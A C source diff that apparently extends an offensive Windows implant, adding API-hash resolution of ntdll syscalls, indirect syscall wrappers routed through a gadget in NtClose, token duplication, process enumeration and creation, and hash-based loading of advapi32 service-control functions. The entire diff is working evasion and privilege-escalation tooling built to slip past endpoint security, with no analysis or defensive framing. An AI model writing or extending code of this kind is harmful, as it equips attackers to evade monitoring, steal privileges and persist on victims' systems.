@@ -156,11 +156,55 @@ BOOL resolve_syscalls(void) {
     ok &= resolve_one(ntdll, H_NtEnumerateKey, &g_ssn.NtEnumerateKey, &g_addr.NtEnumerateKey);
     ok &= resolve_one(ntdll, H_NtOpenProcessToken, &g_ssn.NtOpenProcessToken, &g_addr.NtOpenProcessToken);
     ok &= resolve_one(ntdll, H_NtAdjustPrivilegesToken, &g_ssn.NtAdjustPrivilegesToken, &g_addr.NtAdjustPrivilegesToken);
+    resolve_one(ntdll, H_NtGetNextProcess, &g_ssn.NtGetNextProcess, &g_addr.NtGetNextProcess);
+    resolve_one(ntdll, H_NtCreateProcessEx, &g_ssn.NtCreateProcessEx, &g_addr.NtCreateProcessEx);
+    resolve_one(ntdll, H_NtDuplicateToken, &g_ssn.NtDuplicateToken, &g_addr.NtDuplicateToken);
+    resolve_one(ntdll, H_NtSetInformationThread, &g_ssn.NtSetInformationThread, &g_addr.NtSetInformationThread);
+    resolve_one(ntdll, H_NtDelayExecution, &g_ssn.NtDelayExecution, &g_addr.NtDelayExecution);
+    resolve_one(ntdll, H_NtCreateUserProcess, &g_ssn.NtCreateUserProcess, &g_addr.NtCreateUserProcess);
+    resolve_one(ntdll, H_NtWaitForSingleObject, &g_ssn.NtWaitForSingleObject, &g_addr.NtWaitForSingleObject);
+    g_addr.RtlCreateProcessParametersEx = get_export_by_hash(ntdll, H_RtlCreateProcessParametersEx);
+    g_addr.RtlDestroyProcessParameters = get_export_by_hash(ntdll, H_RtlDestroyProcessParameters);
 
     if (g_addr.NtClose)
         g_ret_gadget = (BYTE *)g_addr.NtClose + 2;
 
     return ok;
+}
+
+/* ── Resolve advapi32 service functions ──────────────────── */
+
+typedef NTSTATUS (NTAPI *PFN_LdrLoadDll)(
+    PWSTR, PULONG, PUNICODE_STRING, PVOID *);
+
+BOOL resolve_service_funcs(void) {
+    PVOID ntdll = get_ntdll_base();
+    if (!ntdll) return FALSE;
+
+    PFN_LdrLoadDll pLoad = (PFN_LdrLoadDll)get_export_by_hash(
+        ntdll, H_LdrLoadDll);
+    if (!pLoad) return FALSE;
+
+    wchar_t dll_name[] = L"advapi32.dll";
+    UNICODE_STRING us;
+    us.Buffer = dll_name;
+    us.Length = 24;
+    us.MaximumLength = 26;
+
+    PVOID hMod = NULL;
+    NTSTATUS st = pLoad(NULL, NULL, &us, &hMod);
+    if (st != 0 || !hMod) return FALSE;
+
+    g_addr.pfnStartDispatcher = get_export_by_hash(
+        hMod, H_StartServiceCtrlDispatcherW);
+    g_addr.pfnRegHandler = get_export_by_hash(
+        hMod, H_RegisterServiceCtrlHandlerW);
+    g_addr.pfnSetStatus = get_export_by_hash(
+        hMod, H_SetServiceStatus);
+
+    return g_addr.pfnStartDispatcher &&
+           g_addr.pfnRegHandler &&
+           g_addr.pfnSetStatus;
 }
 
 /* ── Typed syscall wrappers ──────────────────────────────── */
@@ -299,4 +343,49 @@ NTSTATUS sys_NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivi
     return indirect_syscall_s2(g_ssn.NtAdjustPrivilegesToken, g_addr.NtAdjustPrivilegesToken,
                            TokenHandle, (ULONG_PTR)DisableAllPrivileges, NewState,
                            BufferLength, PreviousState, ReturnLength);
+}
+
+NTSTATUS sys_NtGetNextProcess(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
+                               ULONG HandleAttributes, ULONG Flags,
+                               PHANDLE NewProcessHandle) {
+    return indirect_syscall_s2(g_ssn.NtGetNextProcess, g_addr.NtGetNextProcess,
+                           ProcessHandle, DesiredAccess, HandleAttributes,
+                           Flags, NewProcessHandle);
+}
+
+NTSTATUS sys_NtCreateProcessEx(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
+                                POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess,
+                                ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort,
+                                HANDLE ExceptionPort, ULONG InJob) {
+    return indirect_syscall_s7(g_ssn.NtCreateProcessEx, g_addr.NtCreateProcessEx,
+                           ProcessHandle, DesiredAccess, ObjectAttributes, ParentProcess,
+                           Flags, SectionHandle, DebugPort, ExceptionPort, InJob);
+}
+
+NTSTATUS sys_NtDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess,
+                               POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly,
+                               TOKEN_TYPE TokenType, PHANDLE NewTokenHandle) {
+    return indirect_syscall_s2(g_ssn.NtDuplicateToken, g_addr.NtDuplicateToken,
+                           ExistingTokenHandle, DesiredAccess, ObjectAttributes,
+                           (ULONG_PTR)EffectiveOnly, (ULONG_PTR)TokenType, NewTokenHandle);
+}
+
+NTSTATUS sys_NtSetInformationThread(HANDLE ThreadHandle,
+                                     DWORD ThreadInformationClass,
+                                     PVOID ThreadInformation,
+                                     ULONG ThreadInformationLength) {
+    return indirect_syscall(g_ssn.NtSetInformationThread, g_addr.NtSetInformationThread,
+                           ThreadHandle, ThreadInformationClass,
+                           ThreadInformation, ThreadInformationLength);
+}
+
+NTSTATUS sys_NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval) {
+    return indirect_syscall(g_ssn.NtDelayExecution, g_addr.NtDelayExecution,
+                           (ULONG_PTR)Alertable, DelayInterval);
+}
+
+NTSTATUS sys_NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
+                                    PLARGE_INTEGER Timeout) {
+    return indirect_syscall(g_ssn.NtWaitForSingleObject, g_addr.NtWaitForSingleObject,
+                           Handle, (ULONG_PTR)Alertable, Timeout);
 }
